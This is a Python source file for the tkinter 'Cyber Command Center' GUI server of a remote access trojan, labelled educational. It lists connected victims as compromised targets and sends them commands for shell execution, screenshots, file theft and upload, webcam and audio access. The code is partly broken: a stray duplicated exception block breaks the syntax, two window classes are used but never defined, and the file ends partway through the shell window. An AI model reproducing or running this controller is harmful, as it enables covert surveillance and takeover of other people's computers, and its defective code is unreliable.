#!/usr/bin/env python3
"""
Remote Access Tool - GUI Server Component (Educational Version)
Enhanced Ethical Hacking Theme Desktop GUI implementation using tkinter

This code is provided for educational purposes to demonstrate basic client-server
network programming concepts and system administration capabilities.
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import socket
import threading
import json
import os
import base64
import time
from datetime import datetime
from PIL import Image, ImageTk
import io

class RemoteServerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("◉ CYBER COMMAND CENTER ◉")
        self.root.geometry("1400x900")
        self.root.configure(bg='#0a0a0a')
        
        # Enhanced color scheme - Ethical hacking theme
        self.colors = {
            'bg_primary': '#0a0a0a',      # Deep black
            'bg_secondary': '#0d1117',     # Dark grey-black
            'bg_tertiary': '#161b22',      # Lighter dark grey
            'accent_green': '#00ff41',     # Matrix green
            'accent_red': '#ff073a',       # Alert red
            'accent_blue': '#58a6ff',      # Info blue
            'accent_yellow': '#f1c40f',    # Warning yellow
            'text_primary': '#c9d1d9',     # Light grey text
            'text_secondary': '#7d8590',   # Muted grey text
            'border': '#30363d',           # Border color
            'success': '#238636',          # Success green
            'danger': '#da3633',           # Danger red
            'warning': '#bf8700'           # Warning orange
        }
        
        # Server configuration
        self.host = '0.0.0.0'
        self.port = 4444
        self.server_socket = None
        self.clients = {}
        self.client_lock = threading.Lock()
        self.running = False
        self.current_client_id = None
        
        # Setup GUI
        self.setup_styles()
        self.create_widgets()
        self.setup_layout()
        self.animate_title()
        
        # Bind close event
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

    def setup_styles(self):
        """Configure custom styles for ttk widgets with hacking theme"""
        style = ttk.Style()
        style.theme_use('clam')
        
        # Configure dark hacking theme colors
        style.configure('Hacker.TFrame', 
                       background=self.colors['bg_secondary'],
                       borderwidth=1,
                       relief='solid',
                       bordercolor=self.colors['border'])
        
        style.configure('Hacker.TLabel', 
                       background=self.colors['bg_secondary'], 
                       foreground=self.colors['text_primary'],
                       font=('Consolas', 10))
                       
        style.configure('HackerTitle.TLabel', 
                       background=self.colors['bg_primary'], 
                       foreground=self.colors['accent_green'],
                       font=('Courier New', 14, 'bold'))
        
        style.configure('HackerGreen.TButton', 
                       background=self.colors['success'], 
                       foreground='white',
                       font=('Consolas', 9, 'bold'),
                       borderwidth=1)
        style.map('HackerGreen.TButton', 
                 background=[('active', '#2ea043'), ('pressed', '#1a7f37')])
        
        style.configure('HackerRed.TButton', 
                       background=self.colors['danger'], 
                       foreground='white',
                       font=('Consolas', 9, 'bold'),
                       borderwidth=1)
        style.map('HackerRed.TButton', 
                 background=[('active', '#f85149'), ('pressed', '#b62324')])
        
        style.configure('HackerBlue.TButton', 
                       background=self.colors['accent_blue'], 
                       foreground='white',
                       font=('Consolas', 9, 'bold'),
                       borderwidth=1)
        style.map('HackerBlue.TButton', 
                 background=[('active', '#79c0ff'), ('pressed', '#388bfd')])
        
        style.configure('Hacker.Treeview', 
                       background=self.colors['bg_tertiary'], 
                       foreground=self.colors['text_primary'], 
                       fieldbackground=self.colors['bg_tertiary'],
                       borderwidth=1,
                       relief='solid')
        style.configure('Hacker.Treeview.Heading', 
                       background=self.colors['bg_secondary'], 
                       foreground=self.colors['accent_green'],
                       font=('Consolas', 10, 'bold'))
                       
        style.configure('HackerLabelFrame.TLabelframe', 
                       background=self.colors['bg_secondary'],
                       borderwidth=2,
                       relief='solid',
                       bordercolor=self.colors['accent_green'])
        style.configure('HackerLabelFrame.TLabelframe.Label', 
                       background=self.colors['bg_secondary'],
                       foreground=self.colors['accent_green'],
                       font=('Consolas', 11, 'bold'))

    def create_widgets(self):
        """Create all GUI widgets with enhanced hacking theme"""
        # Main frame with border
        self.main_frame = tk.Frame(self.root, bg=self.colors['bg_primary'], 
                                highlightbackground=self.colors['accent_green'], 
                                highlightthickness=2)
        
        # Animated title frame
        self.title_frame = tk.Frame(self.main_frame, bg=self.colors['bg_primary'], height=60)
        self.title_label = tk.Label(self.title_frame, 
                                text="◉ CYBER COMMAND CENTER ◉", 
                                bg=self.colors['bg_primary'], 
                                fg=self.colors['accent_green'],
                                font=('Courier New', 20, 'bold'))
        self.subtitle_label = tk.Label(self.title_frame, 
                                      text="[SECURE CONNECTION ESTABLISHED]", 
                                      bg=self.colors['bg_primary'], 
                                      fg=self.colors['text_secondary'],
                                      font=('Consolas', 10))
        
        # Top frame for server controls with enhanced styling
        self.top_frame = ttk.Frame(self.main_frame, style='Hacker.TFrame')
        
        # Server configuration frame with hacker styling
        self.config_frame = ttk.LabelFrame(self.top_frame, text="◇ SERVER CONFIGURATION ◇", 
                                          style='HackerLabelFrame.TLabelframe')
        
        # Host configuration
        ttk.Label(self.config_frame, text="HOST:", style='Hacker.TLabel').grid(row=0, column=0, padx=10, pady=8, sticky='w')
        self.host_entry = tk.Entry(self.config_frame, 
                                  bg=self.colors['bg_tertiary'], 
                                  fg=self.colors['accent_green'], 
                                  insertbackground=self.colors['accent_green'],
                                  font=('Consolas', 10),
                                  borderwidth=2,
                                  relief='solid')
        self.host_entry.insert(0, self.host)
        self.host_entry.grid(row=0, column=1, padx=5, pady=8)
        
        # Port configuration
        ttk.Label(self.config_frame, text="PORT:", style='Hacker.TLabel').grid(row=0, column=2, padx=10, pady=8, sticky='w')
        self.port_entry = tk.Entry(self.config_frame, 
                                  bg=self.colors['bg_tertiary'], 
                                  fg=self.colors['accent_green'], 
                                  insertbackground=self.colors['accent_green'],
                                  font=('Consolas', 10),
                                  borderwidth=2,
                                  relief='solid')
        self.port_entry.insert(0, str(self.port))
        self.port_entry.grid(row=0, column=3, padx=5, pady=8)
        
        # Enhanced server control buttons
        self.start_button = ttk.Button(self.config_frame, text="◉ ACTIVATE SERVER", 
                                      command=self.start_server, style='HackerGreen.TButton')
        self.start_button.grid(row=0, column=4, padx=15, pady=8)
        
        self.stop_button = ttk.Button(self.config_frame, text="◉ TERMINATE SERVER", 
                                     command=self.stop_server, style='HackerRed.TButton', state='disabled')
        self.stop_button.grid(row=0, column=5, padx=5, pady=8)
        
        # Enhanced status with animation capability
        self.status_frame = tk.Frame(self.top_frame, bg=self.colors['bg_secondary'], 
                                    highlightbackground=self.colors['border'], highlightthickness=1)
        self.status_label = tk.Label(self.status_frame, text="◆ SYSTEM OFFLINE ◆", 
                                    bg=self.colors['bg_secondary'], 
                                    fg=self.colors['accent_red'],
                                    font=('Consolas', 12, 'bold'))
        
        # Middle frame for clients and commands
        self.middle_frame = ttk.Frame(self.main_frame, style='Hacker.TFrame')
        
        # Left panel - Enhanced client list
        self.left_panel = ttk.LabelFrame(self.middle_frame, text="◇ ACTIVE TARGETS ◇", 
                                        style='HackerLabelFrame.TLabelframe')
        
        # Enhanced client treeview
        columns = ('ID', 'TARGET', 'IP_ADDRESS', 'SYSTEM', 'COMPROMISED')
        self.client_tree = ttk.Treeview(self.left_panel, columns=columns, show='headings', 
                                       height=12, style='Hacker.Treeview')
        
        # Configure column headers
        column_widths = {'ID': 50, 'TARGET': 150, 'IP_ADDRESS': 120, 'SYSTEM': 100, 'COMPROMISED': 150}
        for col in columns:
            self.client_tree.heading(col, text=col)
            self.client_tree.column(col, width=column_widths.get(col, 100))
        
        self.client_tree.bind('<<TreeviewSelect>>', self.on_client_select)
        
        # Enhanced scrollbar
        self.client_scrollbar = ttk.Scrollbar(self.left_panel, orient='vertical', command=self.client_tree.yview)
        self.client_tree.configure(yscrollcommand=self.client_scrollbar.set)
        
        # Right panel - Enhanced command center
        self.right_panel = ttk.LabelFrame(self.middle_frame, text="◇ COMMAND CENTER ◇", 
                                         style='HackerLabelFrame.TLabelframe')
        
        # Enhanced command buttons with hacker styling
        button_configs = [
            ("◉ SYSTEM RECON", self.get_system_info, 'HackerBlue.TButton'),
            ("◉ SCREEN CAPTURE", self.take_screenshot, 'HackerBlue.TButton'),
            ("◉ FILE SYSTEM", self.open_file_browser, 'HackerBlue.TButton'),
            ("◉ REMOTE SHELL", self.open_shell, 'HackerGreen.TButton'),
            ("◉ WEBCAM ACCESS", self.open_webcam_control, 'HackerBlue.TButton'),
            ("◉ AUDIO CONTROL", self.open_audio_control, 'HackerBlue.TButton')
        ]
        
        self.command_buttons = []
        for text, command, style in button_configs:
            button = ttk.Button(self.right_panel, text=text, command=command, style=style)
            self.command_buttons.append(button)
        
        # Enhanced command execution frame
        self.cmd_frame = ttk.LabelFrame(self.right_panel, text="◇ QUICK EXPLOIT ◇", 
                                       style='HackerLabelFrame.TLabelframe')
        self.cmd_entry = tk.Entry(self.cmd_frame, 
                                 bg=self.colors['bg_tertiary'], 
                                 fg=self.colors['accent_green'], 
                                 insertbackground=self.colors['accent_green'],
                                 font=('Consolas', 10, 'bold'),
                                 width=25,
                                 borderwidth=2,
                                 relief='solid')
        self.cmd_execute_button = ttk.Button(self.cmd_frame, text="◉ EXECUTE", 
                                            command=self.execute_quick_command, 
                                            style='HackerGreen.TButton')
        
        # Enhanced bottom frame for logs
        self.bottom_frame = ttk.LabelFrame(self.main_frame, text="◇ SYSTEM LOG ◇", 
                                          style='HackerLabelFrame.TLabelframe')
        
        # Enhanced log text area with hacker styling
        self.log_text = scrolledtext.ScrolledText(
            self.bottom_frame, 
            height=10, 
            bg=self.colors['bg_primary'], 
            fg=self.colors['accent_green'], 
            insertbackground=self.colors['accent_green'],
            font=('Consolas', 9),
            borderwidth=2,
            relief='solid',
            selectbackground=self.colors['accent_green'],
            selectforeground=self.colors['bg_primary']
        )
        
        # Disable command buttons initially
        self.disable_client_commands()

    def setup_layout(self):
        """Setup the layout of all widgets with enhanced spacing"""
        self.main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        # Title frame layout
        self.title_frame.pack(fill='x', pady=(0, 15))
        self.title_frame.pack_propagate(False)
        self.title_label.pack(pady=(10, 0))
        self.subtitle_label.pack()
        
        # Top frame layout
        self.top_frame.pack(fill='x', pady=(0, 15))
        self.config_frame.pack(fill='x', pady=(0, 10), padx=10, ipady=10)
        self.status_frame.pack(fill='x', padx=10, pady=5, ipady=8)
        self.status_label.pack()
        
        # Middle frame layout
        self.middle_frame.pack(fill='both', expand=True, pady=(0, 15))
        
        # Left panel layout (client list)
        self.left_panel.pack(side='left', fill='both', expand=True, padx=(10, 8))
        self.client_tree.pack(side='left', fill='both', expand=True, padx=10, pady=10)
        self.client_scrollbar.pack(side='right', fill='y', pady=10, padx=(0, 10))
        
        # Right panel layout (commands)
        self.right_panel.pack(side='right', fill='y', padx=(8, 10))
        
        # Command buttons layout
        for i, button in enumerate(self.command_buttons):
            button.pack(fill='x', pady=4, padx=10)
        
        # Command execution frame layout
        self.cmd_frame.pack(fill='x', pady=(15, 0), padx=10)
        self.cmd_entry.pack(side='left', fill='x', expand=True, padx=(10, 5), pady=10)
        self.cmd_execute_button.pack(side='right', padx=(5, 10), pady=10)
        
        # Bottom frame layout (logs)
        self.bottom_frame.pack(fill='both', expand=True, padx=10)
        self.log_text.pack(fill='both', expand=True, padx=10, pady=10)

    def animate_title(self):
        """Add subtle animation to the title"""
        def pulse_title():
            current_color = self.title_label.cget('fg')
            if current_color == self.colors['accent_green']:
                new_color = '#00cc33'
            else:
                new_color = self.colors['accent_green']
            self.title_label.config(fg=new_color)
            self.root.after(2000, pulse_title)
        
        pulse_title()

    def log_message(self, message):
        """Add a message to the log with enhanced formatting and timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        # Color coding for different message types
        if "Error" in message or "Failed" in message:
            color_prefix = "[ERROR]"
            message_color = self.colors['accent_red']
        elif "connected" in message.lower() or "success" in message.lower():
            color_prefix = "[SUCCESS]"
            message_color = self.colors['accent_green']
        elif "server" in message.lower():
            color_prefix = "[SYSTEM]"
            message_color = self.colors['accent_blue']
        else:
            color_prefix = "[INFO]"
            message_color = self.colors['text_primary']
        
        log_entry = f"[{timestamp}] {color_prefix} {message}\n"
        
        # Insert with color (simplified for this example)
        self.log_text.insert(tk.END, log_entry)
        self.log_text.see(tk.END)
        self.root.update_idletasks()

    def start_server(self):
        """Start the server with enhanced status updates"""
        try:
            self.host = self.host_entry.get()
            self.port = int(self.port_entry.get())
            
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            
            # Update GUI with enhanced styling
            self.start_button.config(state='disabled')
            self.stop_button.config(state='normal')
            self.status_label.config(text=f"◆ SYSTEM ACTIVE - LISTENING ON {self.host}:{self.port} ◆", 
                                   fg=self.colors['accent_green'])
            self.status_frame.config(highlightbackground=self.colors['accent_green'])
            
            self.log_message(f"Command Center activated on {self.host}:{self.port}")
            
            # Start accepting connections in a separate thread
            accept_thread = threading.Thread(target=self.accept_connections, daemon=True)
            accept_thread.start()
            
        except Exception as e:
            messagebox.showerror("SYSTEM ERROR", f"Failed to activate server: {str(e)}")
            self.log_message(f"CRITICAL ERROR: Server activation failed - {str(e)}")

    def stop_server(self):
        """Stop the server with enhanced status updates"""
        self.running = False
        
        # Close all client connections
        with self.client_lock:
            for client_id, client in self.clients.items():
                try:
                    client['socket'].close()
                except:
                    pass
            self.clients.clear()
        
        # Close server socket
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        # Update GUI with enhanced styling
        self.start_button.config(state='normal')
        self.stop_button.config(state='disabled')
        self.status_label.config(text="◆ SYSTEM OFFLINE ◆", fg=self.colors['accent_red'])
        self.status_frame.config(highlightbackground=self.colors['accent_red'])
        self.current_client_id = None
        
        # Clear client list
        for item in self.client_tree.get_children():
            self.client_tree.delete(item)
        
        self.disable_client_commands()
        self.log_message("Command Center deactivated - All connections terminated")

    def accept_connections(self):
        """Accept incoming client connections"""
        while self.running:
            try:
                client_socket, address = self.server_socket.accept()
                client_handler = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, address),
                    daemon=True
                )
                client_handler.start()
            except Exception as e:
                if self.running:
                    self.log_message(f"Connection error: {str(e)}")
                    time.sleep(1)

    def handle_client(self, client_socket, address):
        """Handle a connected client"""
        client_id = None
        try:
            # Receive initial system information
            initial_data = self.receive_data(client_socket)
            if not initial_data:
                client_socket.close()
                return
                
            client_info = json.loads(initial_data)
            client_id = f"{client_info['hostname']}_{client_info['username']}_{address[0]}"
            
            with self.client_lock:
                self.clients[client_id] = {
                    'socket': client_socket,
                    'address': address,
                    'info': client_info,
                    'connected_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
            
            # Update GUI
            self.root.after(0, self.update_client_list)
            self.log_message(f"NEW TARGET ACQUIRED: {client_id} [{address[0]}:{address[1]}]")
            
            # Keep connection alive
            while self.running:
                time.sleep(0.1)
                
        except Exception as e:
            self.log_message(f"Target handling error {address}: {str(e)}")
        finally:
            if client_id:
                self.remove_client(client_id)

    def remove_client(self, client_id):
        """Remove a client from the clients dictionary"""
        with self.client_lock:
            if client_id in self.clients:
                try:
                    self.clients[client_id]['socket'].close()
                except:
                    pass
                del self.clients[client_id]
                
                # Update GUI
                self.root.after(0, self.update_client_list)
                self.log_message(f"TARGET DISCONNECTED: {client_id}")

    def update_client_list(self):
        """Update the client list in the GUI with enhanced formatting"""
        # Clear existing items
        for item in self.client_tree.get_children():
            self.client_tree.delete(item)
        
        # Add current clients
        with self.client_lock:
            for i, (client_id, client) in enumerate(self.clients.items()):
                info = client['info']
                self.client_tree.insert('', 'end', values=(
                    f"T{i:02d}",  # Target ID
                    f"{info['hostname']}_{info['username']}",
                    client['address'][0],
                    info['platform'],
                    client['connected_at']
                ))

    def on_client_select(self, event):
        """Handle client selection with enhanced feedback"""
        selection = self.client_tree.selection()
        if selection:
            item = self.client_tree.item(selection[0])
            target_id = item['values'][0]
            client_index = int(target_id[1:])  # Remove 'T' prefix
            
            with self.client_lock:
                client_ids = list(self.clients.keys())
                if 0 <= client_index < len(client_ids):
                    self.current_client_id = client_ids[client_index]
                    self.enable_client_commands()
                    self.log_message(f"TARGET SELECTED: {self.current_client_id}")

    def enable_client_commands(self):
        """Enable client command buttons"""
        for button in self.command_buttons:
            button.config(state='normal')
        self.cmd_execute_button.config(state='normal')

    def disable_client_commands(self):
        """Disable client command buttons"""
        for button in self.command_buttons:
            button.config(state='disabled')
        self.cmd_execute_button.config(state='disabled')

    # [Rest of the methods remain the same as the original code...]
    def send_command(self, client_id, command_type, data=None):
        """Send a command to a specific client"""
        if data is None:
            data = {}
            
        command = {
            'type': command_type,
            'data': data
        }
        
        try:
            with self.client_lock:
                if client_id in self.clients:
                    client_socket = self.clients[client_id]['socket']
                    self.send_data(client_socket, json.dumps(command))
                    response = self.receive_data(client_socket)
                    if response:
                        return json.loads(response)
                    else:
                        self.log_message(f"No response from target {client_id}")
                        return None
                else:
                    self.log_message(f"Target {client_id} not found")
                    return None
        except Exception as e:
            self.log_message(f"Command transmission error to {client_id}: {str(e)}")
            self.remove_client(client_id)
            return None

    def send_data(self, sock, data):
        """Send data to a socket with length prefix"""
        try:
            serialized_data = data.encode('utf-8')
            data_length = len(serialized_data)
            header = data_length.to_bytes(4, byteorder='big')
            sock.sendall(header + serialized_data)
        except Exception as e:
            raise Exception(f"Data transmission error: {str(e)}")

    def receive_data(self, sock):
        """Receive data from a socket with length prefix"""
        try:
            header = sock.recv(4)
            if not header or len(header) < 4:
                return None
                
            data_length = int.from_bytes(header, byteorder='big')
            
            data = b''
            bytes_received = 0
            while bytes_received < data_length:
                chunk = sock.recv(min(data_length - bytes_received, 4096))
                if not chunk:
                    return None
                data += chunk
                bytes_received += len(chunk)
                
            return data.decode('utf-8')
        except Exception as e:
            raise Exception(f"Data reception error: {str(e)}")

    def get_system_info(self):
        """Get system information from selected client"""
        if not self.current_client_id:
            messagebox.showwarning("TARGET ERROR", "No target selected")
            return
            
        result = self.send_command(self.current_client_id, 'get_sysinfo')
        if result and 'info' in result:
            self.show_system_info(result['info'])

    def show_system_info(self, info):
        """Display system information in a new window with hacker theme"""
        info_window = tk.Toplevel(self.root)
        info_window.title("◉ TARGET RECONNAISSANCE ◉")
        info_window.geometry("600x500")
        info_window.configure(bg=self.colors['bg_primary'])
        
        # Add border
        info_window.configure(highlightbackground=self.colors['accent_green'], highlightthickness=2)
        
        text_widget = scrolledtext.ScrolledText(
            info_window, 
            bg=self.colors['bg_secondary'], 
            fg=self.colors['accent_green'], 
            font=('Consolas', 10),
            insertbackground=self.colors['accent_green'],
            borderwidth=2,
            relief='solid'
        )
        text_widget.pack(fill='both', expand=True, padx=15, pady=15)
        
        text_widget.insert(tk.END, "◇ TARGET SYSTEM ANALYSIS ◇\n")
        text_widget.insert(tk.END, "=" * 50 + "\n\n")
        
        for key, value in info.items():
            if isinstance(value, dict):
                text_widget.insert(tk.END, f"[{key.replace('_', ' ').upper()}]\n")
                for sub_key, sub_value in value.items():
                    text_widget.insert(tk.END, f"  ► {sub_key.replace('_', ' ').title()}: {sub_value}\n")
                text_widget.insert(tk.END, "\n")
            else:
                text_widget.insert(tk.END, f"► {key.replace('_', ' ').title()}: {value}\n")
        
        text_widget.config(state='disabled')

    def take_screenshot(self):
        """Take a screenshot from selected client"""
        if not self.current_client_id:
            messagebox.showwarning("TARGET ERROR", "No target selected")
            return
            
        self.log_message("Capturing target screen...")
        result = self.send_command(self.current_client_id, 'take_screenshot')
        
        if result and 'screenshot' in result:
            self.show_screenshot(result['screenshot'])
        elif result and 'error' in result:
            messagebox.showerror("CAPTURE ERROR", result['error'])

    def show_screenshot(self, screenshot_data):
        """Display screenshot in a new window with hacker theme"""
        try:
            # Decode base64 image
            image_data = base64.b64decode(screenshot_data)
            image = Image.open(io.BytesIO(image_data))
            
            # Resize if too large
            max_size = (900, 700)
            image.thumbnail(max_size, Image.Resampling.LANCZOS)
            
            # Create window
            screenshot_window = tk.Toplevel(self.root)
            screenshot_window.title("◉ TARGET SCREEN CAPTURE ◉")
            screenshot_window.configure(
                bg=self.colors['bg_primary'],
                highlightbackground=self.colors['accent_green'], 
                highlightthickness=2
            )
            
            # Convert to PhotoImage
            photo = ImageTk.PhotoImage(image)
            
            # Display image with frame
            frame = tk.Frame(
                screenshot_window, 
                bg=self.colors['bg_secondary'],
                highlightbackground=self.colors['border'], 
                highlightthickness=1
            )
            frame.pack(padx=10, pady=10)
            
            label = tk.Label(frame, image=photo, bg=self.colors['bg_secondary'])
            label.image = photo  # Keep a reference
            label.pack(padx=5, pady=5)
            
            # Save button
            save_btn = ttk.Button(
                screenshot_window, 
                text="◉ SAVE CAPTURE", 
                command=lambda: self.save_screenshot(image),
                style='HackerGreen.TButton'
            )
            save_btn.pack(pady=10)
            
            self.log_message("Screen capture displayed successfully")
            
        except Exception as e:
            messagebox.showerror("DISPLAY ERROR", f"Failed to display screenshot: {str(e)}")

                
        except Exception as e:
            messagebox.showerror("DISPLAY ERROR", f"Failed to display screenshot: {str(e)}")

    def save_screenshot(self, image):
        """Save screenshot to file"""
        try:
            filename = filedialog.asksaveasfilename(
                defaultextension=".png",
                filetypes=[("PNG files", "*.png"), ("All files", "*.*")],
                title="Save Screenshot"
            )
            if filename:
                image.save(filename)
                self.log_message(f"Screenshot saved: {filename}")
        except Exception as e:
            messagebox.showerror("SAVE ERROR", f"Failed to save screenshot: {str(e)}")

    def execute_quick_command(self):
        """Execute a quick command on selected client"""
        if not self.current_client_id:
            messagebox.showwarning("TARGET ERROR", "No target selected")
            return
            
        command = self.cmd_entry.get().strip()
        if not command:
            messagebox.showwarning("COMMAND ERROR", "Enter a command to execute")
            return
            
        self.log_message(f"Executing command on {self.current_client_id}: {command}")
        result = self.send_command(self.current_client_id, 'execute_command', {'command': command})
        
        if result:
            if 'output' in result:
                self.show_command_output(command, result['output'])
            elif 'error' in result:
                messagebox.showerror("EXECUTION ERROR", result['error'])
        
        self.cmd_entry.delete(0, tk.END)

    def show_command_output(self, command, output):
        """Show command output in a new window"""
        output_window = tk.Toplevel(self.root)
        output_window.title(f"◉ COMMAND OUTPUT: {command} ◉")
        output_window.geometry("800x600")
        output_window.configure(bg=self.colors['bg_primary'],
                               highlightbackground=self.colors['accent_green'], 
                               highlightthickness=2)
        
        text_widget = scrolledtext.ScrolledText(
            output_window,
            bg=self.colors['bg_secondary'],
            fg=self.colors['text_primary'],
            font=('Consolas', 10),
            insertbackground=self.colors['accent_green'],
            borderwidth=2,
            relief='solid'
        )
        text_widget.pack(fill='both', expand=True, padx=15, pady=15)
        
        text_widget.insert(tk.END, f"◇ COMMAND: {command} ◇\n")
        text_widget.insert(tk.END, "=" * 50 + "\n\n")
        text_widget.insert(tk.END, output)
        text_widget.config(state='disabled')

    def open_file_browser(self):
        """Open file browser for selected client"""
        if not self.current_client_id:
            messagebox.showwarning("TARGET ERROR", "No target selected")
            return
            
        FileBrowserWindow(self, self.current_client_id)

    def open_shell(self):
        """Open remote shell for selected client"""
        if not self.current_client_id:
            messagebox.showwarning("TARGET ERROR", "No target selected")
            return
            
        RemoteShellWindow(self, self.current_client_id)

    def open_webcam_control(self):
        """Open webcam control for selected client"""
        if not self.current_client_id:
            messagebox.showwarning("TARGET ERROR", "No target selected")
            return
            
        WebcamControlWindow(self, self.current_client_id)

    def open_audio_control(self):
        """Open audio control for selected client"""
        if not self.current_client_id:
            messagebox.showwarning("TARGET ERROR", "No target selected")
            return
            
        AudioControlWindow(self, self.current_client_id)

    def on_closing(self):
        """Handle window closing event"""
        if messagebox.askokcancel("EXIT SYSTEM", "Terminate Command Center?"):
            self.stop_server()
            self.root.destroy()


class FileBrowserWindow:
    def __init__(self, parent, client_id):
        self.parent = parent
        self.client_id = client_id
        self.current_path = "."
        
        self.window = tk.Toplevel(parent.root)
        self.window.title(f"◉ FILE SYSTEM ACCESS: {client_id} ◉")
        self.window.geometry("900x600")
        self.window.configure(bg=parent.colors['bg_primary'],
                             highlightbackground=parent.colors['accent_green'], 
                             highlightthickness=2)
        
        self.create_widgets()
        self.list_directory()

    def create_widgets(self):
        # Path frame
        path_frame = tk.Frame(self.window, bg=self.parent.colors['bg_secondary'])
        path_frame.pack(fill='x', padx=10, pady=10)
        
        tk.Label(path_frame, text="PATH:", bg=self.parent.colors['bg_secondary'], 
                fg=self.parent.colors['text_primary'], font=('Consolas', 10)).pack(side='left')
        
        self.path_entry = tk.Entry(path_frame, bg=self.parent.colors['bg_tertiary'], 
                                  fg=self.parent.colors['accent_green'], 
                                  font=('Consolas', 10), width=50)
        self.path_entry.pack(side='left', padx=5, fill='x', expand=True)
        
        ttk.Button(path_frame, text="◉ GO", command=self.navigate_to_path,
                  style='HackerBlue.TButton').pack(side='right', padx=5)
        
        # File list
        list_frame = tk.Frame(self.window, bg=self.parent.colors['bg_secondary'])
        list_frame.pack(fill='both', expand=True, padx=10, pady=(0, 10))
        
        columns = ('Name', 'Type', 'Size')
        self.file_tree = ttk.Treeview(list_frame, columns=columns, show='headings', 
                                     style='Hacker.Treeview')
        
        for col in columns:
            self.file_tree.heading(col, text=col)
            self.file_tree.column(col, width=200 if col == 'Name' else 100)
        
        scrollbar = ttk.Scrollbar(list_frame, orient='vertical', command=self.file_tree.yview)
        self.file_tree.configure(yscrollcommand=scrollbar.set)
        
        self.file_tree.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')
        
        self.file_tree.bind('<Double-1>', self.on_double_click)
        
        # Buttons
        btn_frame = tk.Frame(self.window, bg=self.parent.colors['bg_secondary'])
        btn_frame.pack(fill='x', padx=10, pady=(0, 10))
        
        ttk.Button(btn_frame, text="◉ DOWNLOAD", command=self.download_file,
                  style='HackerGreen.TButton').pack(side='left', padx=5)
        ttk.Button(btn_frame, text="◉ UPLOAD", command=self.upload_file,
                  style='HackerBlue.TButton').pack(side='left', padx=5)
        ttk.Button(btn_frame, text="◉ REFRESH", command=self.list_directory,
                  style='HackerBlue.TButton').pack(side='left', padx=5)

    def list_directory(self):
        result = self.parent.send_command(self.client_id, 'list_directory', 
                                        {'path': self.current_path})
        if result and 'files' in result:
            self.path_entry.delete(0, tk.END)
            self.path_entry.insert(0, result['path'])
            self.current_path = result['path']
            
            for item in self.file_tree.get_children():
                self.file_tree.delete(item)
            
            # Add parent directory entry if not root
            if self.current_path != '/':
                self.file_tree.insert('', 'end', values=('..', 'directory', ''))
            
            for file_info in result['files']:
                size = file_info.get('size', '') if file_info['type'] == 'file' else ''
                self.file_tree.insert('', 'end', values=(
                    file_info['name'], file_info['type'], size
                ))

    def navigate_to_path(self):
        self.current_path = self.path_entry.get()
        self.list_directory()

    def on_double_click(self, event):
        selection = self.file_tree.selection()
        if selection:
            item = self.file_tree.item(selection[0])
            name, file_type = item['values'][0], item['values'][1]
            
            if file_type == 'directory':
                if name == '..':
                    self.current_path = os.path.dirname(self.current_path)
                else:
                    self.current_path = os.path.join(self.current_path, name)
                self.list_directory()

    def download_file(self):
        selection = self.file_tree.selection()
        if not selection:
            messagebox.showwarning("SELECTION ERROR", "Select a file to download")
            return
            
        item = self.file_tree.item(selection[0])
        filename, file_type = item['values'][0], item['values'][1]
        
        if file_type == 'directory':
            messagebox.showwarning("SELECTION ERROR", "Cannot download directories")
            return
        
        file_path = os.path.join(self.current_path, filename)
        result = self.parent.send_command(self.client_id, 'download_file', {'path': file_path})
        
        if result and 'content' in result:
            save_path = filedialog.asksaveasfilename(initialname=filename)
            if save_path:
                try:
                    content = base64.b64decode(result['content'])
                    with open(save_path, 'wb') as f:
                        f.write(content)
                    messagebox.showinfo("SUCCESS", f"File downloaded: {save_path}")
                except Exception as e:
                    messagebox.showerror("DOWNLOAD ERROR", str(e))
        elif result and 'error' in result:
            messagebox.showerror("DOWNLOAD ERROR", result['error'])

    def upload_file(self):
        file_path = filedialog.askopenfilename()
        if file_path:
            try:
                with open(file_path, 'rb') as f:
                    content = base64.b64encode(f.read()).decode('utf-8')
                
                filename = os.path.basename(file_path)
                remote_path = os.path.join(self.current_path, filename)
                
                result = self.parent.send_command(self.client_id, 'upload_file', 
                                                {'path': remote_path, 'content': content})
                
                if result and 'path' in result:
                    messagebox.showinfo("SUCCESS", f"File uploaded: {result['path']}")
                    self.list_directory()
                elif result and 'error' in result:
                    messagebox.showerror("UPLOAD ERROR", result['error'])
                    
            except Exception as e:
                messagebox.showerror("UPLOAD ERROR", str(e))


class RemoteShellWindow:
    def __init__(self, parent, client_id):
        self.parent = parent
        self.client_id = client_id
        
        self.window = tk.Toplevel(parent.root)
        self.window.title(f"◉ REMOTE SHELL: {client_id} ◉")
        self.window.geometry("1000x700")
        self.window.configure(bg=parent.colors['bg_primary'],
                             highlightbackground=parent.colors['accent_green'], 
                             highlightthickness=2)
        
        self.create_widgets()

    def create_widgets(self):
        # Output area
        self.output_text = scrolledtext.ScrolledText(
            self.window,
            bg=self.parent.colors['bg_primary'],
            fg=self.parent.colors['accent_green'],
            font=('Consolas', 10),
            insertbackground=self.parent.colors['accent_green'],
            borderwidth=2,
            relief='solid'
        )
        self.output_text.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Command input
        input_frame = tk.Frame(self.window, bg=self.parent.colors['bg_secondary'])
        input_frame.pack(fill='x', padx=10, pady=(0, 10))
        
        tk.Label(input_frame, text="$", bg=self.parent.colors['bg_secondary'],
                fg=self.parent.colors['accent_green'], font=('Consolas', 12, 'bold')).pack(side='left')
        
        self.command_entry = tk.Entry(input_frame, bg=self.parent.colors['bg_tertiary'],
                                     fg=self.parent.colors['accent_green'],
                                     font=('Consolas', 10), insertbackground=self.parent.colors['accent_green'])
        self.command_entry.pack(side='left', fill='x', expand=True, padx=5)
        self.command_entry.bind('<Return>', self.execute_command)
        
        ttk.Button(input_frame, text="◉ EXECUTE", command=self.execute_command,
                  style='HackerGreen.TButton').pack(side='right')
        
